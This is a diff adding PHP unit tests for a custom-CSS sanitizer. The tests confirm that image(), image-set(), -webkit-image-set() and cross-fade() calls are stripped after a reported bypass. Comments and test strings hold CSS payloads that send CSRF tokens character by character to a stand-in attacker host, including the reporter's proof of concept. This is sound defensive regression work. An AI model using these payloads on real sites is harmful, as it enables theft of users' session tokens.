@@ -267,4 +267,86 @@ class SettingCustomCssTest extends TestCase
 
         $this->assertStringContainsString('images/logo.png', $out);
     }
+
+    // Regression for the HusseinTahaSEC report (incomplete fix of
+    // GHSA-v279-2q6w-g8j4). The url() allowlist tightening missed
+    // the sibling CSS image-loading primitives image(), image-set(),
+    // cross-fade(), and the -webkit- variants. All of them reach the
+    // same external-resource fetch primitive the url() allowlist
+    // exists to gate, so a superuser could plant
+    // `input[name="_token"][value^="a"] { background-image: image-set("https://attacker/a"); }`
+    // and exfiltrate CSRF tokens character-by-character via
+    // attribute-selector rules. Fix strips every non-url()
+    // image-loading function call entirely, since legitimate
+    // custom-branding CSS uses url() for logos.
+    public function test_image_set_function_is_stripped(): void
+    {
+        $out = $this->withCustomCss('body { background-image: image-set("https://attacker.example/a" 1x, "https://attacker.example/b" 2x); }');
+
+        $this->assertStringNotContainsString('image-set', $out);
+        $this->assertStringNotContainsString('attacker.example', $out);
+    }
+
+    public function test_image_function_is_stripped(): void
+    {
+        $out = $this->withCustomCss('body { background-image: image("https://attacker.example/exfil"); }');
+
+        $this->assertStringNotContainsString('image(', $out);
+        $this->assertStringNotContainsString('attacker.example', $out);
+    }
+
+    public function test_webkit_image_set_function_is_stripped(): void
+    {
+        // -webkit-image-set is the vendor-prefixed sibling of image-set
+        // and reaches the same fetch primitive. Older Safari / Chrome
+        // honor it. Must be stripped alongside the unprefixed form.
+        $out = $this->withCustomCss('body { background: -webkit-image-set(url("https://attacker.example/a") 1x); }');
+
+        $this->assertStringNotContainsString('-webkit-image-set', $out);
+        $this->assertStringNotContainsString('attacker.example', $out);
+    }
+
+    public function test_cross_fade_function_is_stripped(): void
+    {
+        // cross-fade can take image() or image-set() as children, so
+        // leaving it unstripped would let an attacker nest the real
+        // fetch call inside a cross-fade wrapper and bypass stripping
+        // of the inner. The outer-function strip handles the whole
+        // function call via balanced-paren walking.
+        $out = $this->withCustomCss('body { background-image: cross-fade(url("https://attacker.example/a") 50%, url("https://attacker.example/b") 50%); }');
+
+        $this->assertStringNotContainsString('cross-fade', $out);
+        $this->assertStringNotContainsString('attacker.example', $out);
+    }
+
+    public function test_attribute_selector_image_set_csrf_exfil_payload_is_neutered(): void
+    {
+        // Reporter's PoC verbatim. Simulated attribute-based token
+        // exfil shape, demonstrates image-set() stripped before any
+        // url inside gets a chance to run through the allowlist.
+        $out = $this->withCustomCss(
+            'input[name="_token"][value^="a"] { background-image: image-set("https://attacker.example/c?a"); }'
+            .'input[name="_token"][value^="b"] { background-image: image-set("https://attacker.example/c?b"); }'
+            .'* { background-image: image("https://attacker.example/ping"); }'
+        );
+
+        $this->assertStringNotContainsString('attacker.example', $out);
+        $this->assertStringNotContainsString('image-set', $out);
+        $this->assertStringNotContainsString('image(', $out);
+    }
+
+    public function test_balanced_paren_walker_handles_nested_url_inside_image_set(): void
+    {
+        // image-set can wrap url() calls as children. The stripper
+        // must not stop at the inner close-paren of the nested url(),
+        // which a naive non-balanced regex would do. Balanced-paren
+        // walking in stripImageLoadingFunctions handles this.
+        $out = $this->withCustomCss('body { background: image-set(url("https://attacker.example/a") 1x, url("https://attacker.example/b") 2x); color: red; }');
+
+        $this->assertStringNotContainsString('attacker.example', $out);
+        $this->assertStringNotContainsString('image-set', $out);
+        // Non-stripped CSS after the function should still be present
+        // and well-formed.
+        $this->assertStringContainsString('color: red', $out);
+    }
 }
